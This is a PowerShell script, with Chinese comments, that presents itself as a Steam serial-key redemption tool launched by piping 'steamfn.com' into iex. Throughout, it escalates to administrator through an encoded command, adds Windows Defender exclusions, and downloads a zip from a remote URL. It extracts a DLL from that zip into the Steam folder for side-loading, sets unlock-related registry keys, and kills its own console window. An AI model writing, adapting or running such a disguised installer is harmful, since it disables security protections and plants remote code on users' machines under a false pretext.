# Steam CDK 序號兌換
# 使用方式:
#   irm steamfn.com | iex

[Console]::InputEncoding  = [System.Text.Encoding]::UTF8
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$ProgressPreference = 'SilentlyContinue'

# ─── 管理員自動提權 ───────────────────────────────────────────────────────────
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    try {
        $scriptText = $MyInvocation.MyCommand.Definition
        if ([string]::IsNullOrWhiteSpace($scriptText)) {
            $scriptText = (irm steamfn.com -UseBasicParsing)
        }
        $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptText))
        Start-Process powershell -Verb RunAs `
            -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded"
    } catch {
        Write-Host "[需要管理員權限，請右鍵「以系統管理員身份執行」]" -ForegroundColor Red
        Start-Sleep 5
    }
    exit
}

cls
Write-Host "正在網路初始化中..." -ForegroundColor Cyan

# ─── 輔助函式 ─────────────────────────────────────────────────────────────────
function Remove-IfExists($path) {
    if (Test-Path $path) { Remove-Item $path -Force -ErrorAction SilentlyContinue }
}

function ForceStop-Steam {
    Get-Process "steam" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    if (Get-Process "steam" -ErrorAction SilentlyContinue) {
        Start-Process cmd -ArgumentList "/c taskkill /f /im steam.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
    }
}

function Get-FileRobust($url, $dest) {
    Remove-IfExists $dest

    # 方法 1: HttpWebRequest
    try {
        [Net.ServicePointManager]::SecurityProtocol = `
            [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
        try { [Net.ServicePointManager]::SecurityProtocol =
            [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls13 } catch {}
        [Net.ServicePointManager]::Expect100Continue    = $false
        [Net.ServicePointManager]::DefaultConnectionLimit = 512
        [Net.ServicePointManager]::UseNagleAlgorithm    = $false

        $req = [Net.HttpWebRequest]::Create($url)
        $req.UserAgent         = "Mozilla/5.0"
        $req.AllowAutoRedirect = $true
        $req.Timeout           = 30000
        $req.ReadWriteTimeout  = 120000
        $req.KeepAlive         = $true
        try { $req.AutomaticDecompression =
            [Net.DecompressionMethods]::GZip -bor [Net.DecompressionMethods]::Deflate } catch {}

        $resp = $req.GetResponse()
        $rs   = $resp.GetResponseStream()
        $fs   = New-Object IO.FileStream($dest, [IO.FileMode]::Create, [IO.FileAccess]::Write, [IO.FileShare]::None, 4MB)
        $buf  = New-Object byte[] 4MB
        while (($n = $rs.Read($buf, 0, $buf.Length)) -gt 0) { $fs.Write($buf, 0, $n) }
        $fs.Flush(); $fs.Close(); $rs.Close(); $resp.Close()
        if ((Test-Path $dest) -and (Get-Item $dest).Length -gt 0) { return $true }
    } catch {}

    # 方法 2: BITS
    try {
        if (Get-Command Start-BitsTransfer -ErrorAction SilentlyContinue) {
            Start-BitsTransfer -Source $url -Destination $dest -Priority Foreground -ErrorAction Stop
            if ((Test-Path $dest) -and (Get-Item $dest).Length -gt 0) { return $true }
        }
    } catch {}

    # 方法 3: WebClient
    try {
        $wc = New-Object Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $wc.DownloadFile($url, $dest)
        $wc.Dispose()
        if ((Test-Path $dest) -and (Get-Item $dest).Length -gt 0) { return $true }
    } catch {}

    return $false
}

function Expand-ZipTo($zipPath, $dest) {
    if (-not (Test-Path $dest)) { New-Item $dest -ItemType Directory -Force | Out-Null }
    try {
        Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue
        $z = [IO.Compression.ZipFile]::OpenRead($zipPath)
        try {
            foreach ($e in $z.Entries) {
                $target = Join-Path $dest $e.FullName
                if ([string]::IsNullOrEmpty($e.Name)) {
                    if (-not (Test-Path $target)) { New-Item $target -ItemType Directory -Force | Out-Null }
                    continue
                }
                $dir = Split-Path $target -Parent
                if (-not (Test-Path $dir)) { New-Item $dir -ItemType Directory -Force | Out-Null }
                try { [IO.Compression.ZipFileExtensions]::ExtractToFile($e, $target, $true) } catch {}
            }
            return $true
        } finally { $z.Dispose() }
    } catch {}
    try { Expand-Archive -Path $zipPath -DestinationPath $dest -Force -ErrorAction Stop; return $true } catch {}
    return $false
}

# ─── Steam 路徑 ───────────────────────────────────────────────────────────────
$steamRegPath      = 'HKCU:\Software\Valve\Steam'
$steamToolsRegPath = 'HKCU:\Software\Valve\Steamtools'
$steamPath         = ""

if (Test-Path $steamRegPath) {
    $p = Get-ItemProperty $steamRegPath -ErrorAction SilentlyContinue
    if ($p -and $p.PSObject.Properties['SteamPath']) { $steamPath = $p.SteamPath }
}

if ([string]::IsNullOrWhiteSpace($steamPath) -or -not (Test-Path $steamPath -PathType Container)) {
    Write-Host "您的電腦沒有安裝官方正版 Steam 客戶端，請安裝後再次嘗試。" -ForegroundColor Red
    Start-Sleep 10; exit
}

# ─── 關閉 Steam ───────────────────────────────────────────────────────────────
ForceStop-Steam

# ─── 清理衝突 DLL ─────────────────────────────────────────────────────────────
Remove-IfExists (Join-Path $steamPath "user32.dll")
Remove-IfExists (Join-Path $steamPath "hid.dll")
Remove-IfExists (Join-Path $steamPath "steam.cfg")
Remove-IfExists (Join-Path $steamPath "package\beta")
Remove-IfExists (Join-Path $steamPath "version.dll")
Remove-IfExists (Join-Path $steamPath "versions.dll")
Remove-IfExists (Join-Path $steamPath "dwmapi.dll")
Remove-IfExists (Join-Path $steamPath "bin\dwmapi.dll")

# ─── 下載並部署 SteamTools xinput1_4.dll ─────────────────────────────────────
$resUrl  = "https://steamusercontent-a.akamaihd.net/ugc/12496635105303643204/C80CF1B9FF31D32512FD51F2B664F6E0607FA6F8/"
$zipPath = Join-Path $env:TEMP "res.zip"

try { Add-MpPreference -ExclusionPath $zipPath  -ErrorAction SilentlyContinue } catch {}
try { Add-MpPreference -ExclusionPath $steamPath -ErrorAction SilentlyContinue } catch {}

$ok = Get-FileRobust $resUrl $zipPath
if (-not $ok -or -not (Test-Path $zipPath) -or (Get-Item $zipPath).Length -eq 0) {
    Remove-IfExists $zipPath
    Write-Host "[網路獲取文件失敗，請檢查網路後重試]" -ForegroundColor Red
    Start-Sleep 10; exit
}

$ok = Expand-ZipTo $zipPath $steamPath
Remove-IfExists $zipPath
if (-not $ok) {
    Write-Host "[資源解壓失敗，請重試]" -ForegroundColor Red
    Start-Sleep 10; exit
}

# ─── 設定 Registry（CDK 模式）────────────────────────────────────────────────
if (-not (Test-Path $steamToolsRegPath)) {
    New-Item -Path $steamToolsRegPath -Force | Out-Null
}
Remove-ItemProperty -Path $steamToolsRegPath -Name "ActivateUnlockMode" -ErrorAction SilentlyContinue
Remove-ItemProperty -Path $steamToolsRegPath -Name "AlwaysStayUnlocked"  -ErrorAction SilentlyContinue
Remove-ItemProperty -Path $steamToolsRegPath -Name "notUnlockDepot"       -ErrorAction SilentlyContinue
Set-ItemProperty    -Path $steamToolsRegPath -Name "iscdkey" -Value "true" -Type String

# ─── 啟動 Steam ───────────────────────────────────────────────────────────────
$steamExe = Join-Path $steamPath "steam.exe"
$launched = $false
try { Start-Process explorer.exe -ArgumentList "`"$steamExe`"" -ErrorAction Stop; $launched = $true } catch {}
if (-not $launched) { try { Start-Process $steamExe -ErrorAction Stop; $launched = $true } catch {} }
if (-not $launched) { Start-Process "steam://" }

Write-Host "[已成功連接正版啟動服務，請登入 Steam 來啟動序號]" -ForegroundColor Green

# ─── 倒數關閉 ────────────────────────────────────────────────────────────────
for ($i = 5; $i -ge 1; $i--) {
    Write-Host "`r[本視窗將在 $i 秒後關閉...]" -NoNewline
    Start-Sleep 1
}

$proc = Get-CimInstance Win32_Process -Filter "ProcessId = '$PID'" -ErrorAction SilentlyContinue
if ($proc) {
    $parent = Get-CimInstance Win32_Process -Filter "ProcessId = '$($proc.ParentProcessId)'" -ErrorAction SilentlyContinue
    if ($parent -and $parent.ProcessName -match 'powershell|WindowsTerminal|cmd') {
        Stop-Process -Id $parent.ProcessId -Force -ErrorAction SilentlyContinue
    }
}
exit
